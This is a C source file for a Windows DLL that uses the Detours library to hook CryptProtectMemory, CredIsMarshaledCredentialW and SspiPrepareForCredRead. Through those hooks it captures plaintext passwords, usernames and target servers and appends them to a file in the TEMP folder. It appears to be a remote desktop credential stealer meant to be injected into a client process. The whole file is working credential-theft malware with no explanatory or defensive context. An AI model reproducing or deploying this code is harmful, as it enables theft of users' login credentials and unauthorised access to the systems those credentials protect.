#include<windows.h>
#include<detours.h>
#include<dpapi.h>
#include<wincred.h>
#include<strsafe.h>
#include<subauth.h>
#define SECURITY_WIN32
#include<sspi.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")

LPCWSTR lpTempPassword = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpServer = NULL;

void WriteCredentials(){
    const DWORD buf = 1024;
    WCHAR TempFolder[MAX_PATH];
    GetEnvironmentVariableW(L"TEMP", TempFolder, MAX_PATH);
    WCHAR Path[MAX_PATH];
    StringCbPrintfW(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
    WCHAR DataBuffer[1024];
    memset(DataBuffer, 0, sizeof(DataBuffer));
    StringCbPrintfW(DataBuffer, buf, L"Username: %s, Password: %s, Server: %s", lpUsername, lpTempPassword, lpServer);
    HANDLE hFile = CreateFileW(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwBytesWritten = 0;
    WriteFile(hFile, DataBuffer, wcslen(DataBuffer)*2, &dwBytesWritten, NULL);
    CloseHandle(hFile);
}

static SECURITY_STATUS(WINAPI *OriginalSspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) = SspiPrepareForCredRead;
SECURITY_STATUS _SspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName){
    lpServer = pszTargetName;
    return OriginalSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
}

static BOOL(WINAPI *OriginalCryptProtectMemory)(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags) = CryptProtectMemory;
BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags){
    DWORD cbPass = 0;
    LPVOID lpPassword;
    int *ptr = (int *)pDataIn;
    LPVOID lpPasswordAddress = ptr + 0x1;
    memcpy_s(&cbPass, 4, pDataIn, 4);

    if (cbPass > 0x2) {
		SIZE_T written = 0;
		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress,cbPass,&written);
		lpTempPassword = (LPCWSTR)lpPassword;
	}

	return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);

}

static BOOL(WINAPI *OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;
BOOL _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential){
    lpUsername = MarshaledCredential;
	if (wcslen(lpUsername) > 0) {
		
		WriteCredentials();
	}
	return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    if ( DetourIsHelperProcess() ){
        return TRUE;
    }

    if (dwReason == DLL_PROCESS_ATTACH) {
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalCryptProtectMemory, (PVOID)_CryptProtectMemory);
        DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, (PVOID)_CredIsMarshaledCredentialW);
        DetourAttach(&(PVOID&)OriginalSspiPrepareForCredRead, (PVOID)_SspiPrepareForCredRead);
        DetourTransactionCommit();
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalCryptProtectMemory, (PVOID)_CryptProtectMemory);
        DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, (PVOID)_CredIsMarshaledCredentialW);
        DetourDetach(&(PVOID&)OriginalSspiPrepareForCredRead, (PVOID)_SspiPrepareForCredRead);
        DetourTransactionCommit();

    }
    return TRUE;
}